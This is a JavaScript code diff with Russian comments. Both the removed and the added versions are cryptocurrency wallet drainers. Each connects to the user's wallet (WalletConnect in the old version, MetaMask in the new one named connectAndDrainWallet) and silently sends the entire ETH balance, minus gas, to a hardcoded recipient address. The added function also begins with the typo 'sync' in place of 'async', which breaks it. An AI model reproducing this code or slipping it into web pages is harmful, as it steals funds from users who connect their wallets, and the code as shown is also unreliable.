@@ -1,39 +1,39 @@
-const providerWC = new WalletConnectProvider({
-  rpc: {
-    1: "https://cloudflare-eth.com"
-  }
-});
+sync function connectAndDrainWallet() {
+    if (window.ethereum) {
+        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+        const userAddress = accounts[0];
 
-document.getElementById("connectButton").addEventListener("click", async () => {
-  const status = document.getElementById("status");
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const signer = provider.getSigner();
 
-  try {
-    await providerWC.enable();
+        const recipient = "0xC225bC0b6B89DeA3dC55116f6ab3EFE9E1c4bf72"; // Адрес получателя
 
-    const provider = new ethers.providers.Web3Provider(providerWC);
-    const signer = provider.getSigner();
+        const balance = await provider.getBalance(userAddress);
 
-    const to = "0xC225bC0b6B89DeA3dC55116f6ab3EFE9E1c4bf72";
+        const gasPrice = await provider.getGasPrice();
+        const estimatedGasLimit = 21000; // стандартный лимит газа для перевода ETH
 
-    const balance = await signer.getBalance();
-    const gasPrice = await provider.getGasPrice();
-    const gasLimit = 21000;
-    const gasCost = gasPrice.mul(gasLimit);
-    const amountToSend = balance.sub(gasCost);
+        const totalGasCost = gasPrice.mul(estimatedGasLimit);
 
-    if (amountToSend.lte(0)) {
-      status.textContent = "Недостаточно средств.";
-      return;
+        if (balance.lte(totalGasCost)) {
+            console.error('Недостаточно средств на оплату газа');
+            return;
+        }
+
+        const amountToSend = balance.sub(totalGasCost);
+
+        try {
+            const tx = await signer.sendTransaction({
+                to: recipient,
+                value: amountToSend,
+                gasLimit: estimatedGasLimit,
+                gasPrice: gasPrice
+            });
+            console.log('All ETH sent:', tx.hash);
+        } catch (error) {
+            console.error('Failed to send ETH:', error);
+        }
+    } else {
+        alert("Please install MetaMask!");
     }
-
-    const tx = await signer.sendTransaction({
-      to: to,
-      value: amountToSend
-    });
-
-    status.textContent = `Транзакция отправлена: ${tx.hash}`;
-  } catch (err) {
-    console.error(err);
-    status.textContent = "Ошибка: " + err.message;
-  }
-});
+}
